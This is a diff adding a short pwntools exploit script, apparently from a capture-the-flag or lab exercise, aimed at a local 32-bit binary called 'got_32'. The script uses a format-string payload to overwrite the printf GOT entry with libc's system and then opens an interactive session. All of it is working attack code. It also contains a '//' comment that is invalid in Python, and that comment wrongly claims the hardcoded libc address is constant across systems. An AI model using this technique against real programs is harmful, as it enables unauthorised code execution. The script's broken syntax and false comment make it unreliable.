@@ -1,0 +1,13 @@
+from pwn import *
+
+context.update(arch="i386",os="linux")
+elf=ELF("./got_32",checksec=False)
+
+proc=process("./got_32")
+
+libc=elf.libc
+libc.address=0xf7dba000                 // find by running ldd some elf and the address of libc.so.6 constant across diff systems
+payload=fmtstr_payload(4,{ elf.got.printf : libc.symbols.system})
+proc.sendline(payload)
+print(payload)
+proc.interactive()
